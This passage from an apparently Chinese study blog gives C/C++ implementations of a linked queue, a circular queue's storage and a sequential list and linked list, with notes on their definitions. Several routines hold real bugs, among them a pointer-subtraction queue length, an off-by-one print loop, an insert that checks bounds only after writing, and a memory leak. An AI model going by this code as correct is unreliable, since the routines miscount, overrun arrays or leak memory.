title="链队列的操作实现"></a>链队列的操作实现</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>  <span class="title class_">QNode</span>&#123;</span><br><span class="line">    QElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,QElemType e)</span></span>&#123;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=(QueuePtr)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;The Queue is empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//队列空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Element exist.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//队列非空</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueLength</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Q.rear-Q.front;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueTravers</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    QueuePtr p = Q.front-&gt;next;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt;i&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;p-&gt;data&lt;&lt; endl;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClearQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p = Q.front-&gt;next;</span><br><span class="line">        Q.front-&gt;next = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.rear = Q.front;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Clear succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ClearQueue</span>(Q);</span><br><span class="line">    <span class="built_in">free</span>(Q.front);</span><br><span class="line">   <span class="comment">// free(Q.rear); 不用再次释放同一地址了</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Destory succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetHead</span><span class="params">(LinkQueue Q,QElemType &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        QueuePtr p= Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Empty!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="type">int</span> test;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;input Elem number:&quot;</span>;</span><br><span class="line">    cin&gt;&gt;test;</span><br><span class="line">    QElemType e;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;test;i++)&#123;</span><br><span class="line">        e=<span class="built_in">rand</span>();</span><br><span class="line">        <span class="built_in">EnQueue</span>(Q, e);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">/* QElemType e1;</span></span><br><span class="line"><span class="comment">    e1.a=1;</span></span><br><span class="line"><span class="comment">    QElemType e2;</span></span><br><span class="line"><span class="comment">    e2.a=2;</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e1);</span></span><br><span class="line"><span class="comment">    EnQueue(Q, e2);*/</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;the length is:&quot;</span>&lt;&lt;<span class="built_in">QueueLength</span>(Q)&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">    QElemType ge;</span><br><span class="line">    <span class="built_in">GetHead</span>(Q, ge);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ge is:&quot;</span>&lt;&lt;ge&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">DeQueue</span>(Q, ge);</span><br><span class="line">    <span class="built_in">QueueTravers</span>(Q);</span><br><span class="line">   <span class="comment">// ClearQueue(Q);</span></span><br><span class="line">   <span class="comment">// QueueTravers(Q);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;the length is:&quot;&lt;&lt;QueueLength(Q)&lt;&lt;endl;</span></span><br><span class="line">  <span class="comment">//  DestoryQueue(Q);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p>循环队列是顺序队列的特例，把顺序队列构造成一个首尾相连的循环表</p><p>存储实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> QElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  QElemType *base;</span><br><span class="line">  <span class="type">int</span> front;</span><br><span class="line">  <span class="type">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p>循环队列空状态和满状态都满足Q.front==Q.rear</p><p>1.可以另设一个变量count记录队列中的元素个数，当为0时队列空；当为MASQSIZE时队列满</p><p>2.以头指针在队列尾指针的下一位置作为队列满的标志，牺牲一个存储空间 队满条件为：(sq.rear+1)% maxsize==sq.front</p><p>​     队空条件为：sq.rear==sq.front</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 线性表</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
        <content type="html"><![CDATA[<h3 id="线性表的定义和特点"><a href="#线性表的定义和特点" class="headerlink" title="线性表的定义和特点"></a>线性表的定义和特点</h3><h4 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h4><p>线性表是n个类型相同元素的有限序列，通常记作($a_1$,$a_2$,$a_3$,…,$a_n$)</p><h4 id="线性表的特点"><a href="#线性表的特点" class="headerlink" title="线性表的特点"></a>线性表的特点</h4><p>1.集合中必存在唯一的一个第一元素</p><p>2.集合中必存在唯一的一个最后元素</p><p>3.除最后元素之外，均有唯一的后继</p><p>4.除第一元素之外，均有唯一的前驱</p><h4 id="线性表的抽象数据类型描述"><a href="#线性表的抽象数据类型描述" class="headerlink" title="线性表的抽象数据类型描述"></a>线性表的抽象数据类型描述</h4><p>ADT List {</p><p>​    数据对象：D={$a_i$|$a_j$ $\in$ElemSet,i=1,2…,n,n$\geqslant$0}</p><p>​                            {称n为线性表的表长；</p><p>​                                称n=0时的线性表为空表}</p><p>​    数据关系：R={&lt;$a_{i-1}$,$a_i$&gt;,$a_i$ $\in$ D,i=2,3,…,n}</p><p>​    基本操作：</p><p>​            InitList(&amp;L)    //构造空线性表</p><p>​            DestoryList(&amp;L)   //销毁线性表L</p><p>​            ListEmpty(L)    //    判断L是否空</p><p>​            ListLength(L)    //求L长度</p><p>​            PriorElem(L,cur_e,&amp;pre_e)    //求前驱</p><p>​            NextElem(L,cur_e,&amp;next_e)    //求后继</p><p>​            GetElem(L,i,&amp;e)    //取i位置的值</p><p>​            PutElem(&amp;L,i,e)    //线性表赋值</p><p>​            LocateElem(L,e,compare())    //在线性表中查找e</p><p>​            ListTraverse(L,visit())     //遍历线性表</p><p>​            ClearList(&amp;L)    //清空线性表</p><p>​            ListInsert(&amp;L,i,e)     //在i位置插入e</p><p>​            ListDelete(&amp;L,i,&amp;e)    //删除i位置的元素</p><p>​    }ADT List</p><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><h4 id="存储结构实现"><a href="#存储结构实现" class="headerlink" title="存储结构实现"></a>存储结构实现</h4><p>用一组地址连续的存储单元依次存放线性表中的数据元素</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现"><a href="#基本操作实现" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_INIT_SIZE 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Elemtype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype *elem;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="type">int</span> listsize;</span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList_Sq</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    L.elem=(Elemtype*)<span class="built_in">malloc</span>(LIST_INIT_SIZE*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    &#125;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    L.listsize=LIST_INIT_SIZE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;InitList SqList successfully.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowList_Sq</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=L.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,L.elem[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DestoryList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.elem);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListEmpty</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L.length==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SqList is not empty.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PriorElem</span><span class="params">(SqList L,<span class="type">int</span> cur_e,Elemtype &amp;pre_e )</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur_e&lt;=<span class="number">0</span>||L.length==<span class="number">0</span>||cur_e&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pre_e=L.elem[cur_e<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype e)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;--j)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j+<span class="number">1</span>]=L.elem[j];</span><br><span class="line">    &#125;</span><br><span class="line">    L.elem[i<span class="number">-1</span>]=e;</span><br><span class="line">    ++L.length;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert operation succeed.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (L.length&gt;=L.listsize)&#123;</span><br><span class="line">        Elemtype *newbase;</span><br><span class="line">        newbase=(Elemtype*)<span class="built_in">realloc</span>(L.elem,(L.listsize+LISTINCREMENT)*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">        <span class="keyword">if</span>(!newbase) <span class="built_in">printf</span>(<span class="string">&quot;failed!&quot;</span>);</span><br><span class="line">        L.elem=newbase;</span><br><span class="line">        L.listsize+=LISTINCREMENT;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e=L.elem[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">-1</span>;j&lt;L.length<span class="number">-1</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j]=L.elem[j+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;delete succeed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0---exit\n1--InitList_Sq\n2--DestoryList\n3--ShowList_Sq\n4--ListEmpty\n5--ListLength\n6--PriorElem\n7--ListInsert_Sq\n8--ListDelete_Sq\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;================================\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> temp;SqList L;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input button:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process exit.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">1</span>) InitList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">2</span>) DestoryList(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">3</span>) ShowList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">4</span>) ListEmpty(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;List length:%d\n&quot;</span>,ListLength(L));</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">6</span>)&#123;</span><br><span class="line">            Elemtype pre_e;</span><br><span class="line">            <span class="type">int</span> cur_e;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input cur_e:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;cur_e);</span><br><span class="line">            PriorElem(L, cur_e, pre_e);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;PriorElem is:%d&quot;</span>,pre_e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">7</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;insert before i:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input data(int):&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;e);</span><br><span class="line">            ListInsert_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">8</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input number to delete:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            ListDelete_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h4><p>优点：节省存储空间；对线性表中的第i个结点的操作易于实现；容易查找一个结点的前驱和后继</p><p>缺点：插入和删除需要移动数据；建立空表时较难确定所需的存储空间</p><h3 id="线性表的链式表示和实现"><a href="#线性表的链式表示和实现" class="headerlink" title="线性表的链式表示和实现"></a>线性表的链式表示和实现</h3><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现-1"><a href="#基本操作实现-1" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1;</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListEmpty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="keyword">return</span> TRUE;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">return</span> FALSE;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode* p;</span><br><span class="line">    p=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p=L-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    e = p-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    LNode* p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *s;</span><br><span class="line">    s=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data=e;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Insert succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode *p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *q=p-&gt;next;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    e=q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Delete succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(L-&gt;next)&#123;</span><br><span class="line">        LNode *p;</span><br><span class="line">        p=L-&gt;next;</span><br><span class="line">        L-&gt;next=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span 